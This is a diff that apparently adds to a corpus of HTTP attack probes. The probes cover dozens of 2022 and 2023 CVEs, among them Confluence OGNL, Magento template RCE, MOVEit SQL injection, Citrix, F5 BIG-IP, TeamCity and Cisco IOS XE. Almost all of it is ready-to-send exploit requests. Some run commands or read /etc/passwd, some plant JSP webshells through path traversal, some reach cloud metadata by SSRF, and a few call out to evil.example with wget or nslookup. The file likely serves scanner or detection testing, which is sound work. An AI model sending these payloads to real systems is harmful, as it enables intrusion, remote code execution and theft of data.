+GET /admin/%0dxyz
+
+# --- CVE-2022-23131 (Zabbix frontend: forged zbx_session SAML data) ---
+GET /index_sso.php header="Cookie: zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9"
+GET /zabbix/index_sso.php header="Cookie: zbx_session=eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiIiwic2lnbiI6IiJ9"
+
+# --- CVE-2022-24086 (Adobe Commerce / Magento: email template directive RCE) ---
+POST /rest/default/V1/guest-carts/1/shipping-information header="Content-Type: application/json" body="{\"addressInformation\":{\"shipping_address\":{\"firstname\":\"{{var this.getTemplateFilter().addAfterFilterCallback(system).filter(id)}}\",\"lastname\":\"x\",\"street\":[\"x\"],\"city\":\"x\",\"postcode\":\"1\",\"countryId\":\"US\",\"telephone\":\"1\"},\"shipping_method_code\":\"flatrate\",\"shipping_carrier_code\":\"flatrate\"}}"
+POST /rest/default/V1/guest-carts/1/payment-information header="Content-Type: application/json" body="{\"cartId\":\"1\",\"billingAddress\":{\"firstname\":\"{{var this.getTemplateFilter().addAfterFilterCallback(system).filter(cat$IFS/etc/passwd)}}\",\"lastname\":\"x\",\"street\":[\"x\"],\"city\":\"x\",\"postcode\":\"1\",\"countryId\":\"US\",\"telephone\":\"1\"},\"paymentMethod\":{\"method\":\"checkmo\"},\"email\":\"a@b.c\"}"
+
+# --- CVE-2022-24112 (Apache APISIX: batch-requests admin API bypass) ---
+POST /apisix/batch-requests header="Content-Type: application/json" header="X-Real-IP: 127.0.0.1" body="{\"headers\":{\"X-Real-IP\":\"127.0.0.1\",\"Content-Type\":\"application/json\"},\"timeout\":1500,\"pipeline\":[{\"method\":\"PUT\",\"path\":\"/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1\",\"body\":\"{\\\"uri\\\":\\\"/pwn\\\",\\\"upstream\\\":{\\\"type\\\":\\\"roundrobin\\\",\\\"nodes\\\":{\\\"127.0.0.1:80\\\":1}},\\\"filter_func\\\":\\\"function(vars) os.execute('id'); return true end\\\"}\"}]}"
+POST /apisix/batch-requests header="X-Real-IP: 127.0.0.1" body="{\"headers\":{\"X-Real-IP\":\"127.0.0.1\"},\"pipeline\":[{\"method\":\"GET\",\"path\":\"/apisix/admin/routes?api_key=edd1c9f034335f136f87ad84b625c8f1\"}]}"
+
+# --- CVE-2022-24816 (GeoServer / JAI-EXT: WPS Jiffle script injection) ---
+POST /geoserver/wms header="Content-Type: application/xml" body="<?xml version=\"1.0\"?><wps:Execute service=\"WPS\" xmlns:wps=\"http://www.opengis.net/wps/1.0.0\" xmlns:ows=\"http://www.opengis.net/ows/1.1\"><ows:Identifier>ras:Jiffle</ows:Identifier><wps:DataInputs><wps:Input><ows:Identifier>coverage</ows:Identifier><wps:Data><wps:ComplexData mimeType=\"application/arcgrid\">ncols 1 nrows 1 xllcorner 0 yllcorner 0 cellsize 1 NODATA_value -1 1</wps:ComplexData></wps:Data></wps:Input><wps:Input><ows:Identifier>script</ows:Identifier><wps:Data><wps:LiteralData>dest = y(); class Double { static { java.lang.Runtime.getRuntime().exec(\"id\"); } }</wps:LiteralData></wps:Data></wps:Input></wps:DataInputs><wps:ResponseForm><wps:RawDataOutput mimeType=\"image/tiff\"><ows:Identifier>result</ows:Identifier></wps:RawDataOutput></wps:ResponseForm></wps:Execute>"
+
+# --- CVE-2022-25237 (Bonita: path parameter API authorization bypass) ---
+POST /bonita/API/pageUpload;i18ntranslation?action=add header="Content-Type: multipart/form-data; boundary=boundary" body="Content-Disposition: form-data; name=\"file\"; filename=\"api_extension.zip\""
+GET /bonita/API/extension/rce?p=0&c=1&cmd=id
+
+# --- CVE-2022-26134 (Atlassian Confluence: pre-auth OGNL in the URI) ---
+GET /%24%7B%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
+GET /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20evil.example%22%29%7D/
+
+# --- CVE-2022-26352 (dotCMS: ContentResource traversal upload) ---
+POST /api/content/ header="Content-Type: multipart/form-data; boundary=boundary" body="Content-Disposition: form-data; name=\"name\"; filename=\"../../../../../../../../../srv/dotserver/tomcat-9.0.41/webapps/ROOT/pwn.jsp\""
+GET /pwn.jsp
+
+# --- CVE-2022-26960 (elFinder: base64 wrapper in the file target) ---
+GET /elfinder/php/connector.minimal.php?cmd=file&target=l1_%3C%40base64%3E%2Fetc%2Fpasswd%3C%40%2Fbase64%3E&download=1
+GET /elfinder/php/connector.minimal.php?cmd=file&target=l1_%3C%40base64%3E..%2F..%2F..%2F..%2Fetc%2Fpasswd%3C%40%2Fbase64%3E&download=1
+
+# --- CVE-2022-27924 (Zimbra: CRLF memcache injection through the proxy username) ---
+GET /service/home/victim@example.com%0d%0aset%20route:proto=imap;user=victim@example.com%200%20360%200%0d%0aattacker.example:143%0d%0a/file
+GET /service/home/user@example.com%0d%0astats%0d%0a/file
+
+# --- CVE-2022-27925 / CVE-2022-37042 (Zimbra: mboximport ZIP path traversal) ---
+POST /service/extension/backup/mboximport?account-name=admin&ow=2&no-switch=1&append=1 bodyhex=504b030414000000080000002100023fdd5d82000000890000003d0000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a73701dccb10ac2301440d1bd5f110285042128b8292e565dc4163bb4747bb60f4d8d498c2fd1cfb73ade33dc759eb948ca076dc958c14ffda519e6ed014668ea65f1e06cc678993ad8de3fc70554bbb6ec2297abcce29b8d904069a7f6daa000ef8dee81b4b3ea8a74463015d04d047c467cd1cf6a0cc920fd594aa9069c0ac574cb375f504b0102140314000000080000002100023fdd5d82000000890000003d00000000000000000000008001000000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a7370504b050600000000010001006b000000dd0000000000
+GET /zimbraAdmin/0MVzAe6pgwe5go1D.jsp
+
+# --- CVE-2022-29464 (WSO2: toolsAny traversal upload) ---
+POST /fileupload/toolsAny header="Content-Type: multipart/form-data; boundary=boundary" body="Content-Disposition: form-data; name=\"../../../../repository/deployment/server/webapps/authenticationendpoint/pwn.jsp\";filename=\"pwn.jsp\""
+GET /authenticationendpoint/pwn.jsp
+
+# --- CVE-2022-30525 (Zyxel USG FLEX: setWanPortSt command injection) ---
+POST /ztp/cgi-bin/handler header="Content-Type: application/json" body="{\"command\":\"setWanPortSt\",\"proto\":\"dhcp\",\"port\":\"4\",\"vlan_tagged\":\"1\",\"vlanid\":\"5\",\"mtu\":\"; id;\",\"data\":\"hi\"}"
+POST /ztp/cgi-bin/handler header="Content-Type: application/json" body="{\"command\":\"setWanPortSt\",\"proto\":\"dhcp\",\"mtu\":\"; wget http://evil.example/x;\",\"data\":\"hi\"}"
+
+# --- CVE-2022-31101 (PrestaShop blockwishlist: SQL injection in wishlist view) ---
+GET /module/blockwishlist/view?id_wishlist=1&order=p.name,(select%20case%20when%20(1=1)%20then%20(SELECT%20SLEEP(7))%20else%201%20end);--%20.asc
+POST /module/blockwishlist/action?action=addProductToWishlist&params[idWishList]=1%20and%20sleep(5)
+
+# --- CVE-2022-31137 (Roxy-WI: command injection in options endpoint) ---
+POST /app/options.py header="Content-Type: application/x-www-form-urlencoded; charset=UTF-8" header="X-Requested-With: XMLHttpRequest" body="alert_consumer=1&serv=127.0.0.1&ipbackend=\";id;##&backend_server=127.0.0.1"
+POST /app/options.py header="Content-Type: application/x-www-form-urlencoded; charset=UTF-8" body="alert_consumer=1&serv=127.0.0.1&ipbackend=\";cat+/etc/passwd;##&backend_server=127.0.0.1"
+
+# --- CVE-2022-31656 / CVE-2022-31662 (VMware Workspace ONE Access: ;/ traversal to WEB-INF) ---
+GET /SAAS/t/_/;/WEB-INF/web.xml
+
+# --- CVE-2022-31814 (pfSense pfBlockerNG: Host header command injection) ---
+GET /pfblockerng/www/index.php header="Host: ' *; host evil.example; '" header="Accept: */*"
+GET /pfblockerng/www/index.php header="Host: ' *; id; '" header="Accept: */*"
+
+# --- CVE-2022-32532 (Apache Shiro: newline bypass in RegExPatternMatcher) ---
+GET /permit/a%0any
+GET /admin/a%0a
+GET /permit/%0d
+
+# --- CVE-2022-33891 (Apache Spark UI: doAs option command injection) ---
+GET /?doAs=%60id%60
+GET /?doAs=%60ping%20evil.example%60
+
+# --- CVE-2022-35405 (ManageEngine Password Manager Pro: XML-RPC serializable) ---
+POST /xmlrpc header="Content-Type: text/xml" body="<?xml version=\"1.0\"?><methodCall><methodName>test</methodName><params><param><value><struct><member><name>x</name><value><serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">rO0ABQ==</serializable></value></member></struct></value></param></params></methodCall>"
+POST /xmlrpc header="Content-Type: text/xml" body="<?xml version=\"1.0\"?><methodCall><methodName>zoho.poc</methodName><params><param><value><string>x</string></value></param></params></methodCall>"
+
+# --- CVE-2022-35914 (GLPI: htmlawed hhook callback RCE) ---
+POST /vendor/htmlawed/htmlawed/htmLawedTest.php header="Content-Type: application/x-www-form-urlencoded" header="Cookie: sid=foo" body="sid=foo&hhook=exec&text=id"
+POST /vendor/htmlawed/htmlawed/htmLawedTest.php header="Content-Type: application/x-www-form-urlencoded" header="Cookie: sid=foo" body="sid=foo&text=exec&hfoo=id&hhook=array_map"
+
+# --- CVE-2022-36804 (Atlassian Bitbucket: archive endpoint argument injection) ---
+GET /rest/api/latest/projects/PRJ/repos/repo/archive?format=zip&path=bighax&prefix=test/%00test
+GET /rest/api/latest/projects/PRJ/repos/repo/archive?format=zip&path=bighax&prefix=test/%00--remote=/%00--exec=%60id%60%00--prefix=/
+
+# --- CVE-2022-39952 (Fortinet FortiNAC: configWizard keyUpload archive write) ---
+POST /configWizard/keyUpload.jsp header="Content-Type: multipart/form-data; boundary=boundary" body="Content-Disposition: form-data; name=\"key\"; filename=\"poc.zip\""
+
+# --- CVE-2022-40684 (Fortinet FortiOS / FortiProxy: Forwarded header bypass) ---
+GET /api/v2/cmdb/system/admin header="User-Agent: Node.js" header="Forwarded: by=\"[127.0.0.1]:1337\";for=\"[127.0.0.1]:1337\";proto=http;host=" header="X-Forwarded-Vdom: root"
+PUT /api/v2/cmdb/system/admin/admin header="User-Agent: Report Runner" header="Forwarded: for=[127.0.0.1]:8000;by=[127.0.0.1]:9000;" header="Content-Type: application/json" body="{\"ssh-public-key1\":\"ssh-rsa AAAA\"}"
+
+# --- CVE-2022-41040 / CVE-2022-41082 (Microsoft Exchange: ProxyNotShell autodiscover) ---
+GET /autodiscover/autodiscover.json/v1.0/aa..@evil.example/owa/?&Email=autodiscover/autodiscover.json?a..@evil.example&Protocol=Autodiscoverv1&Protocol=Powershell
+GET /autodiscover/autodiscover.json?@evil.example/&Email=autodiscover/autodiscover.json%3f@evil.example
+POST /autodiscover/autodiscover.json?@evil.example/mapi/emsmdb/?&Email=autodiscover/autodiscover.json%3f@evil.example header="Content-Type: application/json" body="{}"
+
+# --- CVE-2022-41678 (Apache ActiveMQ: Jolokia FlightRecorder JSP write) ---
+POST /api/jolokia/ header="Origin: http://127.0.0.1:8161" header="Authorization: Basic YWRtaW46YWRtaW4=" header="Content-Type: application/json" body="{\"type\":\"EXEC\",\"mbean\":\"jdk.management.jfr:type=FlightRecorder\",\"operation\":\"newRecording\",\"arguments\":[]}"
+POST /api/jolokia/ header="Origin: http://127.0.0.1:8161" header="Authorization: Basic YWRtaW46YWRtaW4=" header="Content-Type: application/json" body="{\"type\":\"EXEC\",\"mbean\":\"jdk.management.jfr:type=FlightRecorder\",\"operation\":\"copyTo\",\"arguments\":[1,\"../webapps/admin/test.jsp\"]}"
+GET /admin/test.jsp
+
+# --- CVE-2022-4223 (pgAdmin: unauthenticated binary path validation RCE) ---
+POST /misc/validate_binary_path header="Content-Type: application/json" header="X-pgA-CSRFToken: x" body="{\"utility_path\":\"/tmp/$(id)\"}"
+POST /misc/validate_binary_path header="Content-Type: application/json" body="{\"utility_path\":\"/tmp/$(touch /tmp/pwned)\"}"
+
+# --- CVE-2022-42889 (Apache Commons Text: script/url/dns interpolation) ---
+GET /?q=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27id%27%29%7D
+POST /search body="q=${script:javascript:java.lang.Runtime.getRuntime().exec('id')}"
+GET /?url=%24%7Burl%3AUTF-8%3A%3Ahttp%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F%7D
+GET /?q=%24%7Bscript%3Ajavascript%3A195%2B324%7D
+
+# --- CVE-2022-46364 (Apache CXF: XOP Include SSRF in MTOM requests) ---
+POST /soap header="Content-Type: multipart/related; type=\"application/xop+xml\"; boundary=boundary" bodyhex=2d2d626f756e646172790d0a436f6e74656e742d547970653a206170706c69636174696f6e2f786f702b786d6c3b20636861727365743d5554462d383b20747970653d22746578742f786d6c220d0a436f6e74656e742d5472616e736665722d456e636f64696e673a2062696e6172790d0a0d0a3c736f61703a456e76656c6f706520786d6c6e733a736f61703d22687474703a2f2f736368656d61732e786d6c736f61702e6f72672f736f61702f656e76656c6f70652f223e3c736f61703a426f64793e3c6d3a75706c6f616420786d6c6e733a6d3d22687474703a2f2f6578616d706c652e636f6d2f223e3c6d3a646174613e3c786f703a496e636c75646520786d6c6e733a786f703d22687474703a2f2f7777772e77332e6f72672f323030342f30382f786f702f696e636c7564652220687265663d22687474703a2f2f3136392e3235342e3136392e3235342f6c61746573742f6d6574612d646174612f222f3e3c2f6d3a646174613e3c2f6d3a75706c6f61643e3c2f736f61703a426f64793e3c2f736f61703a456e76656c6f70653e0d0a2d2d626f756e646172792d2d0d0a
+POST /soap header="Content-Type: application/xop+xml" body="<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"http://169.254.169.254/latest/meta-data/\"/></soap:Body></soap:Envelope>"
+
+# --- CVE-2022-47966 (ManageEngine: unauthenticated SAML response processing) ---
+POST /SamlResponseServlet header="Content-Type: application/x-www-form-urlencoded" body="SAMLResponse=PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiPjxzYW1sOkFzc2VydGlvbiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIi8%2BPC9zYW1scDpSZXNwb25zZT4%3D&RelayState="
+
+# --- CVE-2022-47986 (IBM Aspera Faspex: Ruby YAML deserialization) ---
+POST /aspera/faspex/package_relay/relay_package body="{\"package_file_list\": [\"/\"], \"external_emails\": \"\\n---\\n- !ruby/object:Gem::Installer\\n    i: x\\n- !ruby/object:Gem::SpecFetcher\\n    i: y\\n- !ruby/object:Gem::Requirement\\n  requirements:\\n    !ruby/object:Gem::Package::TarReader\\n    io: &1 !ruby/object:Net::BufferedIO\\n      io: &1 !ruby/object:Gem::Package::TarReader::Entry\\n         read: 0\\n         header: \\\"pew\\\"\\n      debug_output: &1 !ruby/object:Net::WriteAdapter\\n         socket: &1 !ruby/object:PrettyPrint\\n             output: !ruby/object:Net::WriteAdapter\\n                 socket: &1 !ruby/module \\\"Kernel\\\"\\n                 method_id: :eval\\n             newline: \\\"throw `id`\\\"\\n             buffer: {}\\n             group_stack:\\n              - !ruby/object:PrettyPrint::Group\\n                break: true\\n         method_id: :breakable\\n\", \"package_name\": \"poc\", \"package_note\": \"poc\", \"original_sender_name\": \"poc\", \"package_uuid\": \"d7cb6601-6db9-43aa-8e6b-dfb4768647ec\", \"metadata_human_readable\": \"Yes\", \"forward\": \"pew\", \"metadata_json\": \"{}\", \"delivery_uuid\": \"d7cb6601-6db9-43aa-8e6b-dfb4768647ec\", \"delivery_sender_name\": \"poc\", \"delivery_title\": \"poc\", \"delivery_note\": \"poc\", \"delete_after_download\": true, \"delete_after_download_condition\": \"IDK\"}"
+
+# --- 2022 attack classes left out ---
+# CVE-2022-22720 / CVE-2022-36760 (httpd request smuggling): triggered by
+#   connection-level framing around a discarded body or an AJP backend, so the
+#   generic Transfer-Encoding / Content-Length probes above already cover the shape.
+# CVE-2022-31813 (httpd X-Forwarded-* stripping): the effect is only observable
+#   at a proxied backend that trusts the headers; there is no distinct request.
+# CVE-2022-28614 / CVE-2022-28615 / CVE-2022-29404 / CVE-2022-30556 (httpd):
+#   large-input and mod_lua memory bugs without a stable request signature.
+# CVE-2022-42252 (Tomcat): request smuggling through
+#   invalid headers/framing; covered by the generic smuggling probes.
+# CVE-2022-34305 / CVE-2022-45143 (Tomcat XSS): CVSS 6.1 / response-shaped error
+#   pages; below the 7.0 threshold or not request-triggered.
+# CVE-2022-29885 / CVE-2022-23181 / CVE-2022-25762 (Tomcat): cluster protocol,
+#   local TOCTOU, and WebSocket race; not plain HTTP requests.
+# CVE-2022-24706 (CouchDB): RCE runs over the Erlang distribution port (epmd /
+#   9100), not HTTP.
+# CVE-2022-26133 (Bitbucket): SharedSecretClusterAuthenticator is abused over
+#   the Hazelcast cluster protocol, not HTTP.
+# CVE-2022-41352 (Zimbra cpio): the trigger is a TAR attachment processed by
+#   amavis after email delivery; no HTTP request carries it.
+# CVE-2022-27925 (Zimbra): the authenticated variant of the CVE-2022-37042
+#   probes above.
+# CVE-2022-31657 / CVE-2022-31658 / CVE-2022-31659 (VMware Workspace ONE):
+#   URL injection needs a victim redirect, and the RCE variants require an admin
+#   session.
+# CVE-2022-22960 / CVE-2022-31660 / CVE-2022-31661 (VMware): local privilege
+#   escalation, no network request.
+# CVE-2022-24682 / CVE-2022-27926 (Zimbra XSS): CVSS 6.1, below the threshold.
+# CVE-2022-3590 (WordPress pingback SSRF): CVSS 5.9, below the threshold.
+# CVE-2022-33980 (Commons Configuration) and CVE-2022-1471 (SnakeYAML):
+#   library-only flaws; the request shape depends on the host application.
+# CVE-2022-2068 (OpenSSL c_rehash): local command execution, no HTTP request.
+# CVE-2022-42475 (FortiOS SSL-VPN): heap overflow driven by a binary payload
+#   whose shape depends on the appliance build.
+# CVE-2022-45378 (Apache SOAP RPCRouterServlet): the advisory confirms the
+#   unauthenticated servlet but no public request-level PoC was found.
+# CVE-2022-31656 / CVE-2022-31662: only the single verified traversal request
+#   from public templates is listed.
+# CVE-2022-22947 / CVE-2022-22965 / CVE-2022-22972 / CVE-2022-47966: the full
+#   exploit chain needs follow-up requests or a signed SAML assertion; the listed
+#   probe carries the injected or bypassing request.
+# CVE-2022-24086: RCE needs a Magento template callback that only fires on some
+#   builds; the probes carry the injected template directive.
+
+# ---------------------------------------------------------------------------
+# 2023 CVEs: attacks against HTTP servers and web frameworks.
+#
+# Grouped by advisory family. Requests that cannot be expressed as a single
+# request line (binary bodies, connection-level framing) are summarized at the end.
+# ---------------------------------------------------------------------------
+
+# --- CVE-2023-34362 / CVE-2023-35036 / CVE-2023-35708 / CVE-2023-36934
+#     (Progress MOVEit Transfer): unauthenticated SQL injection in the
+#     moveitisapi session variables and the REST token endpoint (KEV; CL0P) ---
+POST /moveitisapi/moveitisapi.dll?action=m2 header="X-siLock-Transaction: session_setvars" header="X-siLock-SessVar0: MyPkgID: 0" header="X-siLock-SessVar1: MyPkgSelfProvisionedRecips: SQL Injection'); INSERT INTO activesessions (SessionID) values ('kunato');--"
+POST /moveitisapi/moveitisapi.dll?action=m2 header="X-siLock-Transaction: session_setvars" header="X-siLock-SessVar1: MyUsername: Guest" header="X-siLock-SessVar2: MyGuestEmailAddr: guest@example.com"
+POST /api/v1/auth/token header="Content-Type: application/x-www-form-urlencoded" body="grant_type=session&username=x&password=x"
+POST /guestaccess.aspx header="Content-Type: application/x-www-form-urlencoded" body="Arg06=123&transaction=secmsgpost"
+
+# --- CVE-2023-35078 (Ivanti EPMM): unauthenticated REST API access that
+#     exposes admin user lists (KEV). CVE-2023-35081 needs an authenticated
+#     admin and has no public request-shape PoC, so it is not listed. ---
+GET /mifs/aad/api/v2/admins/users
+
+# --- CVE-2023-3519 (Citrix NetScaler ADC / Gateway): unauthenticated RCE in
+#     SAML processing; the public PoC posts a SAMLRequest to /saml/login.
+#     The probe carries the documented Nuclei template body prefix. ---
+POST /saml/login header="Content-Type: application/x-www-form-urlencoded" body="SAMLRequest=PHNhbWxwOkF1dGhuUmVxdWVzdCB4bWxuczpzYW1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0icGZ4NDFkOGVmMjItZTYxMi04YzUwLTk5NjAtMWIxNmYxNTc0MWIzIiBWZXJzaW9uPSIyLjAiIFByb3ZpZGVyTmFtZT0iU1AgdGVzdCIgRGVzdGluYXRpb249Imh0dHA6Ly9pZHAuZXhhbXBsZS5jb20vU1NPU2VydmljZS5waHAiIFByb3RvY29sQmluZGluZz0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmJpbmRpbmdzOkhUVFAtUE9TVCIgQXNzZXJ0aW9uQ29uc3VtZXJTZXJ2aWNlVVJMPSJodHRwOi8vc3AuZXhhbXBsZS5jb20vZGVtbzEvaW5kZXgucGhwP2FjcyI%2BCiAgPHNhbWw6SXNzdWVyPkE8L3NhbWw6SXNzdWVyPgogIDxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPgogICAgPGRzOlNpZ25lZEluZm8%2BCiAgICAgIDxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8%2BCiAgICAgIDxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8%2BCiAgICAgIDxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8%2BCiAgICAgIDxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8%2BCiAgICAgIDxkczpD"
+
+# --- CVE-2023-4966 (Citrix NetScaler, "CitrixBleed"): unauthenticated memory
+#     disclosure at the OIDC endpoint with an oversized Host header (KEV). The
+#     public PoC pads the Host to ~24812 bytes; the probe keeps the endpoint
+#     and a shorter oversized Host to stay within the line limit. ---
+GET /oauth/idp/.well-known/openid-configuration header="Host: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+POST /logon/LogonPoint/Authentication/GetUserName header="Cookie: NSC_AAAC=00000000000000000000000000000000000000000000000000"
+
+# --- CVE-2023-42793 (JetBrains TeamCity): unauthenticated REST token creation
+#     and debug process execution leading to RCE (KEV) ---
+DELETE /app/rest/users/id:1/tokens/RPC2
+POST /app/rest/users/id:1/tokens/RPC2
+POST /admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true
+POST /app/rest/debug/processes?exePath=echo&params=kunato
+
+# --- CVE-2023-20198 / CVE-2023-20273 (Cisco IOS XE Web UI): unauthenticated
+#     privilege escalation through the WSMA webui endpoint and root command
+#     injection in the web UI (KEV) ---
+POST /%2577eb%2575i_%2577sma_Http header="Content-Type: text/xml; charset=UTF-8" body="<SOAP:Envelope xmlns:SOAP=\"http://schemas.xmlsoap.org/soap/envelope/\"><SOAP:Body><request correlator=\"exec1\" xmlns=\"urn:cisco:wsma-exec\"><execCLI xsd=\"false\"><cmd>uname -a</cmd></execCLI></request></SOAP:Body></SOAP:Envelope>"
+POST /%77eb%75i_%77sma_Http header="Content-Type: text/xml; charset=UTF-8" body="<SOAP:Envelope xmlns:SOAP=\"http://schemas.xmlsoap.org/soap/envelope/\"><SOAP:Body><request correlator=\"exec1\" xmlns=\"urn:cisco:wsma-exec\"><execCLI xsd=\"false\"><cmd>uname -a</cmd></execCLI></request></SOAP:Body></SOAP:Envelope>"
+POST /webui/logoutconfirm.html?logon_hash=1
+POST /webui/rest/softwareMgmt/installAdd header="Content-Type: application/json" body="{\"installMethod\":\"tftp\",\"ipaddress\":\"1000:1000:1000: $(id)\",\"operation_type\":\"SMU\",\"filePath\":\"test\",\"fileSystem\":\"flash:\"}"
+
+# --- CVE-2023-46747 (F5 BIG-IP): unauthenticated TMUI access through AJP
+#     request smuggling, followed by the iControl REST bash endpoint (KEV).
+#     CVE-2023-46748 is an authenticated SQLi without a public single-request
+#     PoC, so only the 46747 chain is listed. ---
+POST /tmui/login.jsp header="Transfer-Encoding: chunked, chunked" header="Content-Type: application/x-www-form-urlencoded" bodyhex=3230340d0a0008485454502f312e310000122f746d75692f436f6e74726f6c2f666f726d0000093132372e302e302e310000096c6f63616c686f73740000096c6f63616c686f7374000050000003000b546d75692d44756262756600000b424242424242424242424200000a52454d4f5445524f4c450000013000a00b00096c6f63616c686f73740003000561646d696e000501715f74696d656e6f773d61265f74696d656e6f775f6265666f72653d2668616e646c65723d253266746d756925326673797374656d25326675736572253266637265617465262626666f726d5f706167653d253266746d756925326673797374656d253266757365722532666372656174652e6a737025336626666f726d5f706167655f6265666f72653d26686964654f626a4c6973743d265f62756676616c75653d65494c3452556e537758596f5055494f47634f4678326f30305863253364265f62756676616c75655f6265666f72653d2673797374656d757365722d68696464656e3d5b5b2241646d696e6973747261746f72222c225b416c6c5d225d5d2673797374656d757365722d68696464656e5f6265666f72653d266e616d653d61646d696e266e616d655f6265666f72653d267061737377643d6b756e61746f706173737764267061737377645f6265666f72653d2666696e69736865643d782666696e69736865645f6265666f72653d00ff000d0a300d0a0d0a
+POST /mgmt/shared/authn/login header="Content-Type: application/json" body="{\"username\":\"admin\",\"password\":\"kunato\"}"
+POST /mgmt/tm/util/bash header="Content-Type: application/json" body="{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
+
+# --- CVE-2023-50164 (Apache Struts): file upload path traversal; the public
+#     PoC mixes the capitalized 'Upload' field with an attacker-controlled
+#     uploadFileName that escapes to webapps/ ---
+POST /upload.action header="Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKunatoStruts" bodyhex=2d2d2d2d2d2d5765624b6974466f726d426f756e646172794b756e61746f5374727574730d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2255706c6f6164223b2066696c656e616d653d226172626974726172792e747874220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a6172626974726172790d0a2d2d2d2d2d2d5765624b6974466f726d426f756e646172794b756e61746f5374727574730d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2275706c6f616446696c654e616d65220d0a0d0a2e2e2f776562617070732f7765627368656c6c2e7761720d0a2d2d2d2d2d2d5765624b6974466f726d426f756e646172794b756e61746f5374727574732d2d0d0a
+
+# --- CVE-2023-22515 (Confluence Data Center / Server): broken access control
+#     lets an unauthenticated attacker reopen setup and create an admin (KEV) ---
+GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=0
